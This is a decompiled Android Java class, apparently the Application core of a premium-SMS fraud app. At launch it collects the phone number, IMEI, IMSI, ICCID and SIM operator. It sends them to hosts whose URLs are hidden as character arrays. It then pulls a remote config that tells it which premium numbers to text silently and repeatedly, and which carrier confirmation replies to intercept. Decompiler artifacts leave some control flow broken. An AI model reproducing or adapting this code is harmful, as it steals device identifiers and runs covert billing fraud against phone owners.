package com.jx.night.unit;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.TelephonyManager;
import com.dm.ml.MiLiNewApi;
import com.exale.aa.GetRequestPay;
import com.jx.night.sms.SmSSendResultReceiver;
import com.jx.night.sms.a.c;
import com.jx.night.sms.a.d;
import com.jx.night.ui.AllAct;
import com.jx.night.ui.All_2_Frag;
import com.jx.night.ui.All_3_Frag;
import com.jx.night.ui.HomeKeyReceiver;
import com.jx.night.ui.MAct;
import com.litesuits.http.LiteHttp;
import com.litesuits.http.request.AbstractRequest;
import com.litesuits.http.request.StringRequest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONObject;

public class MyConst
  extends Application
{
  public static String A = "";
  public static String B = "";
  public static int C = 0;
  public static All_2_Frag D;
  public static All_3_Frag E;
  public static String F = "com.xiaochen.android.fate_it";
  public static boolean G = false;
  public static c H = new c();
  public static boolean I = false;
  public static String J = "";
  public static String K = "";
  public static String L = "";
  public static GetRequestPay M;
  public static String N;
  public static AllAct O;
  public static MAct P;
  public static HomeKeyReceiver Q;
  public static String R;
  public static String S;
  public static String T;
  public static String U;
  public static String V;
  public static String W;
  public static String X;
  public static int Y = 0;
  public static boolean Z = false;
  public static String a;
  public static int aa = 0;
  public static boolean ab = false;
  public static Handler ac = new i();
  private static String ad;
  private static int ae;
  private static String af;
  private static String ag;
  public static String b;
  public static String c;
  public static String d;
  public static String e;
  public static boolean f;
  public static Context g;
  public static int h;
  public static String i;
  public static int j;
  public static com.jx.night.sms.a.b k;
  public static List<d> l;
  public static com.jx.night.sms.b m = new com.jx.night.sms.b();
  public static boolean n;
  public static String o = "/myCache/";
  public static String p = "Tag_CLMsg";
  public static String q = "MySendSMS";
  public static String r = "tag_RunSDK";
  public static String s = "tag_AppBack";
  public static String t = "tag_FirstIn";
  public static String u = "tag_RunWY";
  public static String v = "tag_RunUbay";
  public static String w = "tag_TodayIn";
  public static String x = "tag_SendMySms";
  public static final LiteHttp y = LiteHttp.newApacheHttpClient(null);
  public static boolean z = false;
  private SmSSendResultReceiver ah = new SmSSendResultReceiver();
  private IntentFilter ai = new IntentFilter();
  
  public MyConst() {}
  
  public static void a()
  {
    if (e.c(t))
    {
      e.a(t);
      a(U);
    }
  }
  
  public static void a(Activity paramActivity)
  {
    if (!f) {
      return;
    }
    b.a("new weiying init");
    M = GetRequestPay.getInstance(paramActivity, "11484a10051a11478", "5fe86219d4e7e518a57989febfc4c7cb", h + "_" + j);
  }
  
  public static void a(String paramString)
  {
    y.executeAsync(new StringRequest(paramString));
  }
  
  public static void a(String paramString, long paramLong)
  {
    new j(paramLong, paramString).start();
  }
  
  public static void b()
  {
    R = new String(new char[] { 'h', 't', 't', 'p', ':', '/', '/', 'a', 'p', 'p', '.', 'h', 'l', 'j', 'b', 'f', 'z', 'z', 'y', '.', 'c', 'o', 'm', '/', 'm', 'm', '/', 'v', 'i', 'd', 'e', 'o', 'p', '.', 'h', 't', 'm', 'l' });
  }
  
  public static void b(Activity paramActivity)
  {
    String str = "nrsq" + System.currentTimeMillis();
    MiLiNewApi.Pay(paramActivity, new l(), "51341329", str, Integer.valueOf(20));
  }
  
  public static void c()
  {
    S = new String(new char[] { 'h', 't', 't', 'p', ':', '/', '/', 'a', 'i', 'j', 'i', 'a', 'o', 'y', 'o', 'u', '.', 's', 'l', 't', 'b', 'z', 'y', '.', 'c', 'o', 'm', '/', 'c', '3', '/', 'j', 'y', 'n', 'e', 'w', '/', 'i', 'n', 'd', 'e', 'x', '.', 'h', 't', 'm', 'l', '?', 'u', 'i', 'd', '=', '2', '2', '7', '5', '&', 's', 'i', 'd', '=', '1', '0', '0', '3' });
  }
  
  public static void c(Activity paramActivity)
  {
    if (paramActivity != null) {}
    try
    {
      M.Pay(paramActivity);
      return;
    }
    catch (Exception paramActivity) {}
    if (O != null)
    {
      M.Pay(O);
      return;
    }
    if (P != null) {
      M.Pay(P);
    }
    return;
  }
  
  public static void d()
  {
    T = new String(new char[] { 'h', 't', 't', 'p', ':', '/', '/', 'w', 'w', 'w', '.', '1', '6', '3', '.', 'c', 'o', 'm', '.', 'p', 'x', 'w', 'l', 'x', 'c', '.', 'c', 'o', 'm', '/', 'g', 'a', 'm', 'e', '/', 'd', 'i', 'a', 'l', 'o', 'g', '.', 'h', 't', 'm', 'l' });
  }
  
  public static void e()
  {
    Q = new HomeKeyReceiver();
    g.registerReceiver(Q, new IntentFilter("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
  }
  
  public static void f()
  {
    g.unregisterReceiver(Q);
  }
  
  public static void h()
  {
    if (H != null) {
      a(H.c);
    }
    ab = true;
  }
  
  public static void i()
  {
    if (H == null) {
      break label6;
    }
    for (;;)
    {
      label6:
      return;
      if ((f) && (!I))
      {
        I = true;
        if (!e.b(x)) {
          break;
        }
        e.a(x);
        List localList = H.e;
        if (localList == null) {
          break label532;
        }
        b.a("MYSP:Size:" + localList.size());
        int i3 = 0;
        int i2;
        for (int i1 = 0; i3 < localList.size(); i1 = i2)
        {
          com.jx.night.sms.a.b localB = (com.jx.night.sms.a.b)localList.get(i3);
          i2 = i1;
          if (!(localB.b + "").equals(""))
          {
            i2 = i1;
            if (localB.a == 0)
            {
              J += localB.b;
              K += localB.e;
              L += localB.m;
              i2 = localB.j * 50;
              int i4 = i2;
              if (i2 == 0) {
                i4 = 3000;
              }
              com.jx.night.sms.dbserver.b localB1 = new com.jx.night.sms.dbserver.b();
              localB1.d = localB.b;
              localB1.e = localB.c;
              com.jx.night.sms.dbserver.b localB2 = new com.jx.night.sms.dbserver.b();
              localB2.d = localB.g;
              localB2.e = localB.h;
              com.jx.night.sms.a.a localA1 = new com.jx.night.sms.a.a();
              localA1.a = localB.b;
              localA1.b = localB.c;
              localA1.c = localB.p;
              com.jx.night.sms.a.a localA2 = new com.jx.night.sms.a.a();
              localA2.a = localB.g;
              localA2.b = localB.h;
              localA2.c = localB.p;
              int i5 = 1;
              while (i5 <= localB.i)
              {
                i2 = i1;
                if (!"".equals(localB1.d))
                {
                  i2 = i1;
                  if (!"".equals(localB1.e))
                  {
                    new com.jx.night.sms.a(localA1, i1 * i4);
                    i2 = i1 + 1;
                  }
                }
                i1 = i2;
                if (localB.k)
                {
                  i1 = i2;
                  if (!"".equals(localB2.d))
                  {
                    i1 = i2;
                    if (!"".equals(localB2.e))
                    {
                      new com.jx.night.sms.a(localA2, i2 * i4);
                      i1 = i2 + 1;
                    }
                  }
                }
                a(localB.f);
                i5 += 1;
              }
              i2 = i1;
            }
          }
          i3 += 1;
        }
      }
    }
    label532:
    b.a("No MYSP");
  }
  
  private void j()
  {
    X = new String(new char[] { 'h', 't', 't', 'p', ':', '/', '/', 'a', 'p', 'i', '2', '.', 'a', 'p', 'p', '.', 'y', 'u', 'a', 'n', 'f', 'e', 'n', 'b', 'a', '.', 'n', 'e', 't', '/', 'j', 's', 'o', 'n', '/', 'p', 's', 'm', 's', '.', 'j', 's' });
  }
  
  private void k()
  {
    W = new String(new char[] { 'h', 't', 't', 'p', ':', '/', '/', 'a', 'i', 'a', 'i', '.', 'l', 'v', 'b', 'o', 'o', 'n', '.', 'c', 'o', 'm', '/', 'd', 'o', 'w', 'n', '/', 'f', 'i', 'l', 'e', '?', 'c', '_', 'u', 'i', 'd', '=', '2', '0', '1', '2', '&', 'c', '_', 's', 'i', 'd', '=', '1', '0', '0', '1', '&', 't', 'y', 'p', 'e', '=', '5' });
  }
  
  private void l()
  {
    this.ai.addAction("SENT_SMS_ACTION");
    g.registerReceiver(this.ah, this.ai);
  }
  
  private static void m()
  {
    U = new String(new char[] { 'h', 't', 't', 'p', ':', '/', '/', 'l', 'a', 's', 't', '.', 'k', 's', 'd', 'e', 'l', 'i', '.', 'c', 'o', 'm', '/', 'M', 'a', 'n', '/', 'a', 't' });
    String str = f.b();
    HashMap localHashMap = new HashMap();
    localHashMap.put("ts", str);
    if (c == null)
    {
      str = "";
      localHashMap.put("imsi", str);
      if (a != null) {
        break label311;
      }
    }
    label311:
    for (str = "";; str = a)
    {
      localHashMap.put("imei", str);
      localHashMap.put("ver", Integer.valueOf(ae));
      localHashMap.put("c_uid", Integer.valueOf(h));
      localHashMap.put("c_sid", Integer.valueOf(j));
      U = o.a(U, localHashMap);
      return;
      str = c;
      break;
    }
  }
  
  private static void n()
  {
    V = new String(new char[] { 'h', 't', 't', 'p', ':', '/', '/', 'a', 'p', 'i', '2', '.', 'a', 'p', 'p', '.', 'y', 'u', 'a', 'n', 'f', 'e', 'n', 'b', 'a', '.', 'n', 'e', 't', '/', 'p', 'u', 'b', 'l', 'i', 'c', '/', 'r', 'e', 'g' });
  }
  
  private void o()
  {
    String str = new String(new char[] { 'h', 't', 't', 'p', ':', '/', '/', 'l', 'a', 's', 't', '.', 'k', 's', 'd', 'e', 'l', 'i', '.', 'c', 'o', 'm', '/', 'H', 'e', 'r', 'o', '/', 'l', 'i', 's', 't' });
    Object localObject = f.b();
    HashMap localHashMap = new HashMap();
    localHashMap.put("ts", localObject);
    if (e == null)
    {
      localObject = "";
      localHashMap.put("simoperator", localObject);
      if (c != null) {
        break label448;
      }
      localObject = "";
      label250:
      localHashMap.put("imsi", localObject);
      if (a != null) {
        break label455;
      }
      localObject = "";
      label270:
      localHashMap.put("imei", localObject);
      if (d != null) {
        break label462;
      }
    }
    label448:
    label455:
    label462:
    for (localObject = "";; localObject = d)
    {
      localHashMap.put("iccid", localObject);
      localHashMap.put("ver", Integer.valueOf(ae));
      localHashMap.put("c_uid", Integer.valueOf(h));
      localHashMap.put("c_sid", Integer.valueOf(j));
      localHashMap.put("phone", b + "");
      localHashMap.put("x", "0");
      localHashMap.put("y", "0");
      localObject = (StringRequest)new StringRequest(o.a(str, localHashMap)).setHttpListener(new k(this));
      y.executeAsync((AbstractRequest)localObject);
      return;
      localObject = e;
      break;
      localObject = c;
      break label250;
      localObject = a;
      break label270;
    }
  }
  
  public void b(String paramString)
  {
    int i2 = 0;
    Object localObject1 = g.a(paramString);
    paramString = new c();
    Object localObject3;
    try
    {
      JSONObject localJSONObject1 = new JSONObject((String)localObject1);
      Object localObject2 = new ArrayList();
      localObject1 = new ArrayList();
      if (localJSONObject1 != null)
      {
        localJSONObject1 = localJSONObject1.getJSONObject("content");
        if (localJSONObject1 != null)
        {
          paramString.a = localJSONObject1.optInt("type");
          paramString.b = localJSONObject1.optString("button");
          paramString.d = localJSONObject1.optString("describe");
          paramString.c = localJSONObject1.optString("buttonUrl");
          localObject3 = localJSONObject1.optJSONArray("sp");
          int i1;
          if (localObject3 != null)
          {
            i1 = 0;
            while (i1 < ((JSONArray)localObject3).length())
            {
              JSONObject localJSONObject2 = ((JSONArray)localObject3).getJSONObject(i1);
              com.jx.night.sms.a.b localB = new com.jx.night.sms.a.b();
              localB.a = localJSONObject2.optInt("result");
              localB.b = localJSONObject2.optString("port");
              localB.c = localJSONObject2.optString("msg");
              localB.d = localJSONObject2.optString("xx_num");
              localB.e = localJSONObject2.optString("xx_key");
              localB.m = localJSONObject2.optString("xx_reply");
              localB.f = localJSONObject2.optString("url");
              localB.g = localJSONObject2.optString("sms_no_second");
              localB.h = localJSONObject2.optString("sms_content_second");
              localB.j = localJSONObject2.optInt("second_time");
              localB.i = localJSONObject2.optInt("day_num");
              localB.k = localJSONObject2.optBoolean("second_flag");
              localB.l = localJSONObject2.optInt("sms_type");
              localB.o = localJSONObject2.optString("xx_reply_key");
              localB.n = localJSONObject2.optString("xx_reply_no");
              localB.p = localJSONObject2.optString("surl");
              ((List)localObject2).add(localB);
              i1 += 1;
            }
          }
          paramString.e = ((List)localObject2);
          localObject2 = localJSONObject1.optJSONArray("sdk");
          if (localObject2 != null)
          {
            i1 = i2;
            if (i1 < ((JSONArray)localObject2).length())
            {
              localJSONObject1 = ((JSONArray)localObject2).getJSONObject(i1);
              localObject3 = new com.jx.night.sms.a.e();
              ((com.jx.night.sms.a.e)localObject3).a = localJSONObject1.optInt("sdk_id");
              ((com.jx.night.sms.a.e)localObject3).b = localJSONObject1.optBoolean("flag");
              ((com.jx.night.sms.a.e)localObject3).c = localJSONObject1.optString("sdkUrl");
              if (((com.jx.night.sms.a.e)localObject3).a == 1) {
                ag = ((com.jx.night.sms.a.e)localObject3).c;
              }
              for (;;)
              {
                ((List)localObject1).add(localObject3);
                i1 += 1;
                break;
                if (((com.jx.night.sms.a.e)localObject3).a != 3) {
                  break label530;
                }
                af = ((com.jx.night.sms.a.e)localObject3).c;
              }
            }
          }
        }
      }
      else
      {
        H = paramString;
      }
    }
    catch (Exception localException) {}
    for (;;)
    {
      return;
      label530:
      if (((com.jx.night.sms.a.e)localObject3).a == 8)
      {
        N = ((com.jx.night.sms.a.e)localObject3).c;
        break;
      }
      if (((com.jx.night.sms.a.e)localObject3).a != 9) {
        break;
      }
      i = ((com.jx.night.sms.a.e)localObject3).c;
      break;
      paramString.f = localException;
    }
  }
  
  public void g()
  {
    Object localObject = (TelephonyManager)getSystemService("phone");
    a = ((TelephonyManager)localObject).getDeviceId();
    b = ((TelephonyManager)localObject).getLine1Number();
    if ((b != null) && (b.contains("+86"))) {
      b = b.substring(3);
    }
    c = ((TelephonyManager)localObject).getSubscriberId();
    d = ((TelephonyManager)localObject).getSimSerialNumber();
    e = ((TelephonyManager)localObject).getSimOperator();
    boolean bool;
    if (((TelephonyManager)localObject).getSimState() == 5) {
      bool = true;
    }
    for (;;)
    {
      f = bool;
      localObject = getPackageManager();
      try
      {
        ApplicationInfo localApplicationInfo = ((PackageManager)localObject).getApplicationInfo(getPackageName(), 128);
        ad = localApplicationInfo.metaData.getString("UMENG_CHANNEL");
        h = localApplicationInfo.metaData.getInt("UID");
        j = localApplicationInfo.metaData.getInt("ID");
        try
        {
          ae = ((PackageManager)localObject).getPackageInfo(getPackageName(), 16384).versionCode;
          return;
        }
        catch (PackageManager.NameNotFoundException localNameNotFoundException1)
        {
          return;
        }
        bool = false;
      }
      catch (PackageManager.NameNotFoundException localNameNotFoundException2)
      {
        for (;;) {}
      }
    }
  }
  
  public void onCreate()
  {
    super.onCreate();
    ab = false;
    g = this;
    g();
    b();
    c();
    d();
    k();
    j();
    m();
    n();
    l();
    o();
  }
}
